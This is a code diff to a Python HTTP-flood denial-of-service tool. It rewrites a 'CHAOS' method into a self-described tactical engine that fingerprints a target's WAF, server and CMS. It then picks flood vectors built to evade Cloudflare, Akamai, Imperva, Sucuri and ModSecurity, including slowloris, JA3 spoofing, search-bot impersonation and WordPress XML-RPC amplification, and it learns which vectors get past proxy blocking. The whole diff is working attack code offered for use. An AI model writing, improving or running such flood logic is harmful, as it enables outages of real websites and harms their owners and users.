@@ -2522,65 +2522,320 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
 
-    def CHAOS(self):
-        """[V10] Neural-Heuristic Adaptive Multi-Vector Attack (The Mastermind)
-        Intelligently analyzes target state, proxy health, and path discovery 
-        to execute the most devastating and unblockable sequences."""
+    # ========================================================================
+    #  CHAOS V11 - TACTICAL AI ENGINE
+    #  Phase 1: RECON  -> Probe target, detect WAF/CMS/Server
+    #  Phase 2: PLAN   -> Build weighted strategy from intel
+    #  Phase 3: EXECUTE-> Fire chosen vector
+    #  Phase 4: LEARN  -> Track success/failure, adapt weights
+    # ========================================================================
+    
+    # Class-level persistent memory (shared across all thread instances)
+    _chaos_intel = {
+        "recon_done": False,
+        "waf_type": None,         # cloudflare, akamai, imperva, sucuri, wordfence, modsec, none
+        "server_type": None,      # nginx, apache, litespeed, iis, unknown
+        "cms_type": None,         # wordpress, joomla, drupal, shopify, custom
+        "has_captcha": False,
+        "has_rate_limit": False,
+        "success_count": {},      # method_name -> success_count
+        "fail_count": {},         # method_name -> fail_count (403/429)
+        "phase_ticker": 0,        # Tracks which tactical phase we are in
+    }
+    
+    def _chaos_recon(self):
+        """Phase 1: Tactical Reconnaissance - Probe the target once to gather intel."""
+        intel = self._chaos_intel
+        if intel["recon_done"]:
+            return
+            
+        target_url = f"{self._target.scheme}://{self._target.authority}/"
+        intel["recon_done"] = True
         
-        # Base vector pool with dynamic initial weights
-        chaos_pool = {
-            self.GET: 10, 
-            self.POST: 15, 
-            self.STRESS: 5, 
-            self.PPS: 5, 
-            self.DYN: 10, 
-            self.POST_DYN: 20
+        try:
+            import urllib.request
+            req = urllib.request.Request(target_url, headers={
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+            })
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                headers_raw = str(resp.headers).lower()
+                body = resp.read(8192).decode('utf-8', errors='ignore').lower()
+                status = resp.status
+                server_hdr = resp.headers.get('Server', '').lower()
+                
+                # --- Detect Server Type ---
+                if 'nginx' in server_hdr:
+                    intel["server_type"] = "nginx"
+                elif 'apache' in server_hdr:
+                    intel["server_type"] = "apache"
+                elif 'litespeed' in server_hdr:
+                    intel["server_type"] = "litespeed"
+                elif 'microsoft' in server_hdr or 'iis' in server_hdr:
+                    intel["server_type"] = "iis"
+                elif 'cloudflare' in server_hdr:
+                    intel["server_type"] = "cloudflare"
+                else:
+                    intel["server_type"] = "unknown"
+                
+                # --- Detect WAF Type ---
+                if 'cloudflare' in headers_raw or 'cf-ray' in headers_raw:
+                    intel["waf_type"] = "cloudflare"
+                elif 'akamai' in headers_raw or 'akamaighost' in server_hdr:
+                    intel["waf_type"] = "akamai"
+                elif 'sucuri' in headers_raw or 'x-sucuri' in headers_raw:
+                    intel["waf_type"] = "sucuri"
+                elif 'imperva' in headers_raw or 'incapsula' in headers_raw:
+                    intel["waf_type"] = "imperva"
+                elif 'x-powered-by-plesk' in headers_raw:
+                    intel["waf_type"] = "plesk"
+                elif 'mod_security' in headers_raw or 'modsecurity' in body:
+                    intel["waf_type"] = "modsec"
+                else:
+                    intel["waf_type"] = "none"
+                    
+                # --- Detect CMS Type ---
+                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body:
+                    intel["cms_type"] = "wordpress"
+                elif 'joomla' in body or '/media/system/js' in body:
+                    intel["cms_type"] = "joomla"
+                elif 'drupal' in body or 'sites/default' in body:
+                    intel["cms_type"] = "drupal"
+                elif 'shopify' in body or 'cdn.shopify' in body:
+                    intel["cms_type"] = "shopify"
+                else:
+                    intel["cms_type"] = "custom"
+                    
+                # --- Detect Captcha ---
+                if 'captcha' in body or 'recaptcha' in body or 'turnstile' in body or 'hcaptcha' in body:
+                    intel["has_captcha"] = True
+                    
+                # --- Detect Rate Limiting Headers ---
+                if 'x-ratelimit' in headers_raw or 'retry-after' in headers_raw:
+                    intel["has_rate_limit"] = True
+                    
+        except Exception:
+            # If recon fails (blocked/timeout), assume heavy protection
+            intel["waf_type"] = "unknown_heavy"
+            intel["server_type"] = "unknown"
+            intel["cms_type"] = "custom"
+            intel["has_captcha"] = True
+            
+        # Log intelligence
+        if int(REQUESTS_SENT) < 5:
+            print(f"[CHAOS RECON] WAF: {intel['waf_type']} | Server: {intel['server_type']} | CMS: {intel['cms_type']} | Captcha: {intel['has_captcha']} | RateLimit: {intel['has_rate_limit']}")
+    
+    def _chaos_plan(self):
+        """Phase 2: Tactical Planning - Build weighted attack strategy from gathered intel."""
+        intel = self._chaos_intel
+        
+        # === BASE WEIGHTS ===
+        weights = {
+            "GET": 10,
+            "POST": 10,
+            "STRESS": 5,
+            "PPS": 5,
+            "DYN": 10,
+            "POST_DYN": 15,
+            "SLOW_V2": 0,
+            "STEALTH_JA3": 0,
+            "XMLRPC_AMP": 0,
+            "WP_SEARCH": 0,
+            "BOT": 0,
+            "COOKIE": 0,
         }
         
-        # [INTELLIGENCE 1]: Detect Proxy Exhaustion (WAF Rate Limiting us)
-        # If proxies are dropping quickly, rely more on Stealth and Slowloris to blend in
-        if IS_RECYCLING or (hasattr(self, '_proxies') and self._proxies and len(BURNED_PROXIES) > len(self._proxies) * 0.3):
-            # Target is aggressively blocking. Shift to low & slow / stealth
-            chaos_pool[self.SLOW_V2] = 40
-            if HAS_TLS_CLIENT:
-                chaos_pool[self.STEALTH_JA3] = 80
-            # Drop aggressive noisy methods
-            chaos_pool[self.STRESS] = 0
-            chaos_pool[self.PPS] = 0
-            
-        # [INTELLIGENCE 2]: CMS & Database Fingerprinting
-        if hasattr(self, 'crawled_paths') and self.crawled_paths:
-            path_str = ' '.join(self.crawled_paths).lower()
-            if 'wp-' in path_str or 'wordpress' in path_str:
-                # Deep WP Exploitation
-                chaos_pool[self.XMLRPC_AMP] = 60
-                chaos_pool[self.WP_SEARCH] = 70
-                # Reduce basic GETs when we have direct logic vectors
-                chaos_pool[self.GET] = 5
+        # === STRATEGY A: WAF-Specific Counter-Tactics ===
+        waf = intel.get("waf_type", "none")
         
-        # [INTELLIGENCE 3]: Cryptographic Masking
-        if HAS_TLS_CLIENT and self.STEALTH_JA3 not in chaos_pool:
-             # If not already heavily weighted by Intelligence 1
-             chaos_pool[self.STEALTH_JA3] = 50
-             
-        # Filter pool and calculate roulette
-        active_pool = [(method, weight) for method, weight in chaos_pool.items() if weight > 0]
-        total_weight = sum(weight for _, weight in active_pool)
+        if waf == "cloudflare":
+            # Cloudflare: TLS fingerprinting + JS Challenge. Need stealth + cf_clearance
+            weights["STEALTH_JA3"] = 70
+            weights["SLOW_V2"] = 30
+            weights["POST_DYN"] = 25
+            weights["STRESS"] = 0  # Too noisy, instant block
+            weights["PPS"] = 0
+            weights["BOT"] = 15    # CF whitelists search engine bots
+            
+        elif waf == "akamai":
+            # Akamai: Aggressive bot detection, JA3 profiling
+            weights["STEALTH_JA3"] = 80
+            weights["SLOW_V2"] = 25
+            weights["POST_DYN"] = 20
+            weights["GET"] = 5
+            weights["STRESS"] = 0
+            weights["PPS"] = 0
+            
+        elif waf == "imperva":
+            # Imperva/Incapsula: Cookie validation + behavioral analysis
+            weights["STEALTH_JA3"] = 60
+            weights["COOKIE"] = 30
+            weights["POST_DYN"] = 25
+            weights["SLOW_V2"] = 20
+            weights["DYN"] = 20
+            
+        elif waf == "sucuri":
+            # Sucuri: Cloud proxy WAF, blocks by signature
+            weights["STEALTH_JA3"] = 50
+            weights["POST_DYN"] = 30
+            weights["DYN"] = 25
+            weights["BOT"] = 20     # Sucuri often whitelists bots
+            
+        elif waf == "modsec":
+            # ModSecurity: Rule-based, blocks known attack patterns
+            weights["POST_DYN"] = 35
+            weights["DYN"] = 30
+            weights["COOKIE"] = 20
+            weights["STEALTH_JA3"] = 40
+            # Avoid patterns that trip ModSec rules
+            weights["STRESS"] = 0
+            
+        elif waf in ("unknown_heavy",):
+            # Unknown but clearly protected. Maximum stealth
+            weights["STEALTH_JA3"] = 80
+            weights["SLOW_V2"] = 40
+            weights["POST_DYN"] = 15
+            weights["GET"] = 5
+            weights["STRESS"] = 0
+            weights["PPS"] = 0
+            
+        else:
+            # No WAF detected. Full aggression mode
+            weights["STRESS"] = 30
+            weights["PPS"] = 25
+            weights["GET"] = 25
+            weights["POST"] = 25
+            weights["POST_DYN"] = 30
+            
+        # === STRATEGY B: CMS-Specific Exploitation ===
+        cms = intel.get("cms_type", "custom")
+        
+        if cms == "wordpress":
+            weights["XMLRPC_AMP"] = 65
+            weights["WP_SEARCH"] = 75
+            weights["GET"] = max(weights["GET"] - 5, 2)
+            
+        elif cms == "joomla":
+            # Joomla search is also heavy
+            weights["DYN"] = 40
+            weights["POST_DYN"] = 40
+            
+        elif cms == "shopify":
+            # Shopify is CDN-backed; need stealth + slow
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 60)
+            weights["SLOW_V2"] = 35
+            
+        # === STRATEGY C: Real-Time Battlefield Adaptation ===
+        # If proxies are burning fast, shift to evasive tactics
+        proxy_burn_ratio = 0
+        if hasattr(self, '_proxies') and self._proxies:
+            proxy_burn_ratio = len(BURNED_PROXIES) / max(len(self._proxies), 1)
+            
+        if IS_RECYCLING or proxy_burn_ratio > 0.4:
+            # Defensive mode: blend in, reduce footprint
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 50)
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 70)
+            weights["STRESS"] = 0
+            weights["PPS"] = 0
+            weights["GET"] = max(weights["GET"] // 2, 1)
+        elif proxy_burn_ratio < 0.05:
+            # Offensive mode: target is barely fighting back. Full firepower
+            weights["STRESS"] = max(weights.get("STRESS", 0), 20)
+            weights["PPS"] = max(weights.get("PPS", 0), 15)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 30)
+        
+        # === STRATEGY D: Learning from Success/Failure ===
+        for method_name, successes in intel.get("success_count", {}).items():
+            if method_name in weights:
+                # Reward successful methods
+                weights[method_name] = int(weights[method_name] * 1.3)
+                
+        for method_name, fails in intel.get("fail_count", {}).items():
+            if method_name in weights and fails > 5:
+                # Punish consistently failing methods
+                weights[method_name] = max(int(weights[method_name] * 0.4), 1)
+        
+        # === FILTER: Remove unavailable methods ===
+        if not HAS_TLS_CLIENT:
+            weights["STEALTH_JA3"] = 0
+        if not hasattr(self, '_cf_clearance') or not self._cf_clearance:
+            # Without cf_clearance, BOT method is less effective against CF
+            if waf == "cloudflare":
+                weights["BOT"] = max(weights.get("BOT", 0) // 2, 2)
+        
+        return weights
+        
+    def _chaos_learn(self, method_name, success):
+        """Phase 4: Record outcome to inform future planning decisions."""
+        intel = self._chaos_intel
+        bucket = "success_count" if success else "fail_count"
+        if method_name not in intel[bucket]:
+            intel[bucket][method_name] = 0
+        intel[bucket][method_name] += 1
+    
+    def CHAOS(self):
+        """[V11] Tactical AI Engine - Recon, Plan, Execute, Learn.
+        A self-improving attack algorithm that probes the target once,
+        builds a WAF/CMS-specific strategy, executes with precision,
+        and learns from every response to sharpen future attacks."""
+        
+        # Phase 1: RECON (runs only once per target)
+        self._chaos_recon()
+        
+        # Phase 2: PLAN (recalculated every call with live battlefield data)
+        weights = self._chaos_plan()
+        
+        # Phase 3: EXECUTE (weighted roulette selection)
+        method_map = {
+            "GET": self.GET,
+            "POST": self.POST,
+            "STRESS": self.STRESS,
+            "PPS": self.PPS,
+            "DYN": self.DYN,
+            "POST_DYN": self.POST_DYN,
+            "SLOW_V2": self.SLOW_V2,
+            "XMLRPC_AMP": self.XMLRPC_AMP,
+            "WP_SEARCH": self.WP_SEARCH,
+            "BOT": self.BOT,
+            "COOKIE": self.COOKIE,
+        }
+        if HAS_TLS_CLIENT:
+            method_map["STEALTH_JA3"] = self.STEALTH_JA3
+        
+        active_pool = [(name, w) for name, w in weights.items() if w > 0 and name in method_map]
+        total_weight = sum(w for _, w in active_pool)
         
         if total_weight <= 0:
-            chosen = self.GET
-        else:
-            r = randint(1, total_weight)
-            upto = 0
-            chosen = self.GET # Fallback
-            for method, weight in active_pool:
-                if upto + weight >= r:
-                    chosen = method
-                    break
-                upto += weight
+            self.GET()
+            return
             
+        r = randint(1, total_weight)
+        upto = 0
+        chosen_name = "GET"
+        for name, weight in active_pool:
+            if upto + weight >= r:
+                chosen_name = name
+                break
+            upto += weight
+        
+        chosen_func = method_map.get(chosen_name, self.GET)
+        
+        # Track pre-execution state for learning
+        pre_burned = len(BURNED_PROXIES)
+        pre_errors = int(ERROR_COUNT)
+        
         # Execute the strategically chosen vector
-        chosen()
+        try:
+            chosen_func()
+            # Phase 4: LEARN from outcome
+            post_burned = len(BURNED_PROXIES)
+            post_errors = int(ERROR_COUNT)
+            
+            if post_burned > pre_burned or post_errors > pre_errors + 2:
+                self._chaos_learn(chosen_name, False)
+            else:
+                self._chaos_learn(chosen_name, True)
+        except Exception:
+            self._chaos_learn(chosen_name, False)
 
 
 class ProxyManager:
